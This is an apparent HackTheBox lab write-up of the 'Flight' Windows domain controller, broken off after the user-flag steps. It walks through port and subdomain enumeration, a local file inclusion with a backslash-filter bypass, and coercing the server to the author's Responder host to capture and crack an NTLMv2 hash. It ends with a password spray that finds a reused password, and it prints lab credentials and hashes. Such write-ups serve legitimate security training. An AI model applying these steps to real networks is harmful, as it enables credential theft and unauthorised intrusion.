# Flight - Hard

Target IP: **10.129.104.104**

## User Flag

Initial scan: ```sudo nmap -sC -sV -p- 10.129.228.120 -v```

Output shows a lot of ports open.

```
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Apache httpd 2.4.52 ((Win64) OpenSSL/1.1.1m PHP/8.1.1)
|_http-title: g0 Aviation
| http-methods: 
|   Supported Methods: HEAD GET POST OPTIONS TRACE
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.1
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-11-13 01:50:52Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: flight.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: flight.htb0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49674/tcp open  msrpc         Microsoft Windows RPC
49686/tcp open  msrpc         Microsoft Windows RPC
64351/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: G0; OS: Windows; CPE: cpe:/o:microsoft:windows
```

We can't enumerate SMB without credentials.

```
┌─[us-dedivip-5]─[10.10.15.194]─[htb-mp-3199654@htb-4gcfqtelsa]─[~]
└──╼ [★]$ smbmap -H 10.129.104.104

    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
-----------------------------------------------------------------------------
SMBMap - Samba Share Enumerator v1.10.7 | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

[*] Detected 1 hosts serving SMB                                                                                                  
[*] Established 1 SMB connections(s) and 0 authenticated session(s)                                                      
[!] Access denied on 10.129.104.104, no fun for you...                                                                   
[*] Closed 1 connections                                                                                                     
```

No guest credentials either.

```
┌─[us-dedivip-5]─[10.10.15.194]─[htb-mp-3199654@htb-4gcfqtelsa]─[~]
└──╼ [★]$ smbmap -H 10.129.104.104 -u 'guest' -p ''

    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
-----------------------------------------------------------------------------
SMBMap - Samba Share Enumerator v1.10.7 | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

[*] Detected 1 hosts serving SMB                                                                                                  
[*] Established 1 SMB connections(s) and 0 authenticated session(s)                                                      
[!] Access denied on 10.129.104.104, no fun for you...                                                                       
[*] Closed 1 connections                                                                                                     
```

Let's check the website. This seems to just be a static website.

![1](Screenshots/F_1.jpg)

Let's enumerate further.

We can some interesting results, particularly ```phpmyadmin``` and ```webalizer```.

```
┌─[us-dedivip-5]─[10.10.15.194]─[htb-mp-3199654@htb-4gcfqtelsa]─[~]
└──╼ [★]$ ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.129.104.104/FUZZ -ic -ac

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.129.104.104/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
 :: Follow redirects : false
 :: Calibration      : true
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

images                  [Status: 301, Size: 341, Words: 22, Lines: 10, Duration: 9ms]
                        [Status: 200, Size: 7069, Words: 1546, Lines: 155, Duration: 23ms]
Images                  [Status: 301, Size: 341, Words: 22, Lines: 10, Duration: 6ms]
css                     [Status: 301, Size: 338, Words: 22, Lines: 10, Duration: 19ms]
js                      [Status: 301, Size: 337, Words: 22, Lines: 10, Duration: 7ms]
licenses                [Status: 403, Size: 422, Words: 37, Lines: 12, Duration: 14ms]
IMAGES                  [Status: 301, Size: 341, Words: 22, Lines: 10, Duration: 22ms]
CSS                     [Status: 301, Size: 338, Words: 22, Lines: 10, Duration: 8ms]
JS                      [Status: 301, Size: 337, Words: 22, Lines: 10, Duration: 8ms]
phpmyadmin              [Status: 403, Size: 422, Words: 37, Lines: 12, Duration: 16ms]
webalizer               [Status: 403, Size: 422, Words: 37, Lines: 12, Duration: 20ms]
                        [Status: 200, Size: 7069, Words: 1546, Lines: 155, Duration: 15ms]
server-status           [Status: 403, Size: 422, Words: 37, Lines: 12, Duration: 8ms]
:: Progress: [220547/220547] :: Job [1/1] :: 1290 req/sec :: Duration: [0:01:37] :: Errors: 0 ::
```

However, we are restricted from viewing them, and the other directories are not useful to us.

![2](Screenshots/F_2.jpg)

![3](Screenshots/F_3.jpg)

Let's enumerate for subdomains, adding ```flight.htb``` to our hosts file.

We do get a single hit, ```school```.

```
┌─[us-dedivip-5]─[10.10.15.194]─[htb-mp-3199654@htb-4gcfqtelsa]─[~]
└──╼ [★]$ ffuf -u http://flight.htb -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt -H "Host: FUZZ.flight.htb" -ic -ac

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://flight.htb
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt
 :: Header           : Host: FUZZ.flight.htb
 :: Follow redirects : false
 :: Calibration      : true
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

school                  [Status: 200, Size: 3996, Words: 1045, Lines: 91, Duration: 7ms]
:: Progress: [19964/19964] :: Job [1/1] :: 479 req/sec :: Duration: [0:00:30] :: Errors: 0 ::
```

Let's add this to our hosts file and navigate.

The website seems to be pulling html files from the server with the ```view``` parameter to display the webpage.

![4](Screenshots/F_4.jpg)

This is an immediate candidate for LFI. Let's try to grab the hosts file on Windows.

However, we get an alert message saying our activity has been detected.

![5](Screenshots/F_5.jpg)

It's likely that there is some filtering going on with the value of the ```view``` parameter. After some testing, I figured out that the backslash character was the problematic character. Typing in ```C:``` as the value does not display the alert.

![6](Screenshots/F_6.jpg)

We can try replacing the backslashes with forward slashes. This works.

![7](Screenshots/F_7.jpg)

Since LFI works, maybe we can try RFI. A way we can proceed from here is with responder, and passing in the location of some nonexistent file on our SMB server. Indeed, after passing in ```//10.10.15.194/hi```, we capture a hash for ```svc_apache```.

```
┌─[us-dedivip-5]─[10.10.15.194]─[htb-mp-3199654@htb-4gcfqtelsa]─[~]
└──╼ [★]$ sudo responder -I tun0
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.1.3.0

[SMB] NTLMv2-SSP Client   : 10.129.104.104
[SMB] NTLMv2-SSP Username : flight\svc_apache
[SMB] NTLMv2-SSP Hash     : svc_apache::flight:760885e80748bd06:CB0B1E1F63A7F2A124ED74B3F4CB7AD4:010100000000000080B1A0CFC676DD0146738DC063E5F0C100000000020008004C004F005200350001001E00570049004E002D003500310056004F004A0058005500330037004300550004003400570049004E002D003500310056004F004A005800550033003700430055002E004C004F00520035002E004C004F00430041004C00030014004C004F00520035002E004C004F00430041004C00050014004C004F00520035002E004C004F00430041004C000700080080B1A0CFC676DD0106000400020000000800300030000000000000000000000000300000F85364995C29CAAF878C30BB6BABCE8BE76B8BCD7E2F75982DD0CD2EB28B2D1D0A001000000000000000000000000000000000000900220063006900660073002F00310030002E00310030002E00310035002E003100390034000000000000000000
```

Hashcat is able to crack it for us.

```
SVC_APACHE::flight:760885e80748bd06:cb0b1e1f63a7f2a124ed74b3f4cb7ad4:010100000000000080b1a0cfc676dd0146738dc063e5f0c100000000020008004c004f005200350001001e00570049004e002d003500310056004f004a0058005500330037004300550004003400570049004e002d003500310056004f004a005800550033003700430055002e004c004f00520035002e004c004f00430041004c00030014004c004f00520035002e004c004f00430041004c00050014004c004f00520035002e004c004f00430041004c000700080080b1a0cfc676dd0106000400020000000800300030000000000000000000000000300000f85364995c29caaf878c30bb6babce8be76b8bcd7e2f75982dd0cd2eb28b2d1d0a001000000000000000000000000000000000000900220063006900660073002f00310030002e00310030002e00310035002e003100390034000000000000000000:S@Ss!K@*t13
```

These credentials work for SMB.

```
┌─[us-dedivip-5]─[10.10.15.194]─[htb-mp-3199654@htb-4gcfqtelsa]─[~]
└──╼ [★]$ netexec smb 10.129.104.104 -u svc_apache -p 'S@Ss!K@*t13'
SMB         10.129.104.104  445    G0               [*] Windows 10 / Server 2019 Build 17763 x64 (name:G0) (domain:flight.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.104.104  445    G0               [+] flight.htb\svc_apache:S@Ss!K@*t13 
```

We can enumerate the shares.

```
┌─[us-dedivip-5]─[10.10.15.194]─[htb-mp-3199654@htb-4gcfqtelsa]─[~]
└──╼ [★]$ netexec smb 10.129.104.104 -u svc_apache -p 'S@Ss!K@*t13' --shares
SMB         10.129.104.104  445    G0               [*] Windows 10 / Server 2019 Build 17763 x64 (name:G0) (domain:flight.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.104.104  445    G0               [+] flight.htb\svc_apache:S@Ss!K@*t13 
SMB         10.129.104.104  445    G0               [*] Enumerated shares
SMB         10.129.104.104  445    G0               Share           Permissions     Remark
SMB         10.129.104.104  445    G0               -----           -----------     ------
SMB         10.129.104.104  445    G0               ADMIN$                          Remote Admin
SMB         10.129.104.104  445    G0               C$                              Default share
SMB         10.129.104.104  445    G0               IPC$            READ            Remote IPC
SMB         10.129.104.104  445    G0               NETLOGON        READ            Logon server share 
SMB         10.129.104.104  445    G0               Shared          READ            
SMB         10.129.104.104  445    G0               SYSVOL          READ            Logon server share 
SMB         10.129.104.104  445    G0               Users           READ            
SMB         10.129.104.104  445    G0               Web             READ            
```

Let's connect to the shares.

The ```Users``` share seems like a copy of the ```users``` directory on the remote machine.

```
┌─[us-dedivip-5]─[10.10.15.194]─[htb-mp-3199654@htb-4gcfqtelsa]─[~]
└──╼ [★]$ smbclient //10.129.104.104/Users -U 'flight/svc_apache%S@Ss!K@*t13'
Try "help" to get a list of possible commands.
smb: \> ls
  .                                  DR        0  Thu Sep 22 16:16:56 2022
  ..                                 DR        0  Thu Sep 22 16:16:56 2022
  .NET v4.5                           D        0  Thu Sep 22 15:28:03 2022
  .NET v4.5 Classic                   D        0  Thu Sep 22 15:28:02 2022
  Administrator                       D        0  Mon Oct 31 14:34:00 2022
  All Users                       DHSrn        0  Sat Sep 15 03:28:48 2018
  C.Bum                               D        0  Thu Sep 22 16:08:23 2022
  Default                           DHR        0  Tue Jul 20 15:20:24 2021
  Default User                    DHSrn        0  Sat Sep 15 03:28:48 2018
  desktop.ini                       AHS      174  Sat Sep 15 03:16:48 2018
  Public                             DR        0  Tue Jul 20 15:23:25 2021
  svc_apache                          D        0  Fri Oct 21 14:50:21 2022

		5056511 blocks of size 4096. 1171166 blocks available
```

We are restricted from looking side any other directory except for ```svc_apache```, and it doesn't have anything useful either. However we should note that ```C.Bum``` is another user on the domain.

The ```Web``` share has the files for the websites we saw before, which isn't very useful as of now.

```
┌─[us-dedivip-5]─[10.10.15.194]─[htb-mp-3199654@htb-4gcfqtelsa]─[~]
└──╼ [★]$ smbclient //10.129.104.104/Web -U 'flight/svc_apache%S@Ss!K@*t13'
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Wed Nov 18 02:37:01 2026
  ..                                  D        0  Wed Nov 18 02:37:01 2026
  flight.htb                          D        0  Wed Nov 18 02:37:00 2026
  school.flight.htb                   D        0  Wed Nov 18 02:37:01 2026

		5056511 blocks of size 4096. 1170510 blocks available
```

We can try enumerating usernames with ```lookupsid.py```. It brings some results back which we can put into a username list.

```
┌─[us-dedivip-5]─[10.10.15.194]─[htb-mp-3199654@htb-4gcfqtelsa]─[~]
└──╼ [★]$ lookupsid.py flight/svc_apache:'S@Ss!K@*t13'@10.129.104.104
Impacket v0.14.0.dev0+20260407.172353.7fc084ad - Copyright Fortra, LLC and its affiliated companies 

[*] Brute forcing SIDs at 10.129.104.104
[*] StringBinding ncacn_np:10.129.104.104[\pipe\lsarpc]
[*] Domain SID is: S-1-5-21-4078382237-1492182817-2568127209
498: flight\Enterprise Read-only Domain Controllers (SidTypeGroup)
500: flight\Administrator (SidTypeUser)
501: flight\Guest (SidTypeUser)
502: flight\krbtgt (SidTypeUser)
512: flight\Domain Admins (SidTypeGroup)
513: flight\Domain Users (SidTypeGroup)
514: flight\Domain Guests (SidTypeGroup)
515: flight\Domain Computers (SidTypeGroup)
516: flight\Domain Controllers (SidTypeGroup)
517: flight\Cert Publishers (SidTypeAlias)
518: flight\Schema Admins (SidTypeGroup)
519: flight\Enterprise Admins (SidTypeGroup)
520: flight\Group Policy Creator Owners (SidTypeGroup)
521: flight\Read-only Domain Controllers (SidTypeGroup)
522: flight\Cloneable Domain Controllers (SidTypeGroup)
525: flight\Protected Users (SidTypeGroup)
526: flight\Key Admins (SidTypeGroup)
527: flight\Enterprise Key Admins (SidTypeGroup)
553: flight\RAS and IAS Servers (SidTypeAlias)
571: flight\Allowed RODC Password Replication Group (SidTypeAlias)
572: flight\Denied RODC Password Replication Group (SidTypeAlias)
1000: flight\Access-Denied Assistance Users (SidTypeAlias)
1001: flight\G0$ (SidTypeUser)
1102: flight\DnsAdmins (SidTypeAlias)
1103: flight\DnsUpdateProxy (SidTypeGroup)
1602: flight\S.Moon (SidTypeUser)
1603: flight\R.Cold (SidTypeUser)
1604: flight\G.Lors (SidTypeUser)
1605: flight\L.Kein (SidTypeUser)
1606: flight\M.Gold (SidTypeUser)
1607: flight\C.Bum (SidTypeUser)
1608: flight\W.Walker (SidTypeUser)
1609: flight\I.Francis (SidTypeUser)
1610: flight\D.Truff (SidTypeUser)
1611: flight\V.Stevens (SidTypeUser)
1612: flight\svc_apache (SidTypeUser)
1613: flight\O.Possum (SidTypeUser)
1614: flight\WebDevs (SidTypeGroup)
```

```
┌─[us-dedivip-5]─[10.10.15.194]─[htb-mp-3199654@htb-4gcfqtelsa]─[~]
└──╼ [★]$ cat users
Administrator
Guest
S.Moon
R.Cold
G.Lors
L.Kein
M.Gold
C.Bum
W.Walker
I.Francis
D.Truff
V.Stevens
svc_apache
O.Possum
```

Let's perform a password spray to see if any accounts use the same password as ```svc_apache```.

We find that ```S.Moon``` indeed does.

```
┌─[us-dedivip-5]─[10.10.15.194]─[htb-mp-3199654@htb-4gcfqtelsa]─[~]
└──╼ [★]$ nxc smb 10.129.104.104 -u users -p 'S@Ss!K@*t13' --no-bruteforce --continue-on-success
SMB         10.129.104.104  445    G0               [*] Windows 10 / Server 2019 Build 17763 x64 (name:G0) (domain:flight.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.104.104  445    G0               [-] flight.htb\Administrator:S@Ss!K@*t13 STATUS_LOGON_FAILURE 
SMB         10.129.104.104  445    G0               [-] flight.htb\Guest:S@Ss!K@*t13 STATUS_LOGON_FAILURE 
SMB         10.129.104.104  445    G0               [+] flight.htb\S.Moon:S@Ss!K@*t13 
SMB         10.129.104.104  445    G0               [-] flight.htb\R.Cold:S@Ss!K@*t13 STATUS_LOGON_FAILURE 
SMB         10.129.104.104  445    G0               [-] flight.htb\G.Lors:S@Ss!K@*t13 STATUS_LOGON_FAILURE 
SMB         10.129.104.104  445    G0               [-] flight.htb\L.Kein:S@Ss!K@*t13 STATUS_LOGON_FAILURE 
SMB         10.129.104.104  445    G0               [-] flight.htb\M.Gold:S@Ss!K@*t13 STATUS_LOGON_FAILURE 
SMB         10.129.104.104  445    G0               [-] flight.htb\C.Bum:S@Ss!K@*t13 STATUS_LOGON_FAILURE 
SMB         10.129.104.104  445    G0               [-] flight.htb\W.Walker:S@Ss!K@*t13 STATUS_LOGON_FAILURE 
SMB         10.129.104.104  445    G0               [-] flight.htb\I.Francis:S@Ss!K@*t13 STATUS_LOGON_FAILURE 
SMB         10.129.104.104  445    G0               [-] flight.htb\D.Truff:S@Ss!K@*t13 STATUS_LOGON_FAILURE 
SMB         10.129.104.104  445    G0               [-] flight.htb\V.Stevens:S@Ss!K@*t13 STATUS_LOGON_FAILURE 
SMB         10.129.104.104  445    G0               [+] flight.htb\svc_apache:S@Ss!K@*t13 
SMB         10.129.104.104  445    G0               [-] flight.htb\O.Possum:S@Ss!K@*t13 STATUS_LOGON_FAILURE 
```

```S.Moon``` has RW access on ```Shared```. The name implies that this would contain files that are shared or accessed by many different users.

```
┌─[us-dedivip-5]─[10.10.15.194]─[htb-mp-3199654@htb-4gcfqtelsa]─[~]
└──╼ [★]$ netexec smb 10.129.104.104 -u 'S.Moon' -p 'S@Ss!K@*t13' --shares
SMB         10.129.104.104  445    G0               [*] Windows 10 / Server 2019 Build 17763 x64 (name:G0) (domain:flight.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.104.104  445    G0               [+] flight.htb\S.Moon:S@Ss!K@*t13 
SMB         10.129.104.104  445    G0               [*] Enumerated shares
SMB         10.129.104.104  445    G0               Share           Permissions     Remark
SMB         10.129.104.104  445    G0               -----           -----------     ------
SMB         10.129.104.104  445    G0               ADMIN$                          Remote Admin
SMB         10.129.104.104  445    G0               C$                              Default share
SMB         10.129.104.104  445    G0               IPC$            READ            Remote IPC
SMB         10.129.104.104  445    G0               NETLOGON        READ            Logon server share 
SMB         10.129.104.104  445    G0               Shared          READ,WRITE      
SMB         10.129.104.104  445    G0               SYSVOL          READ            Logon server share 
SMB         10.129.104.104  445    G0               Users           READ            
SMB         10.129.104.104  445    G0               Web             READ            
```






## Root Flag

## Contact

Email: <johnyang4406@gmail.com>, <john_s_yang@brown.edu>

LinkedIn: <https://www.linkedin.com/in/john-yang-747726292/>

HackTheBox: <https://profile.hackthebox.com/profile/019c423f-9b9b-708f-8b31-55983b89dddd?utm_medium=copy_url/>
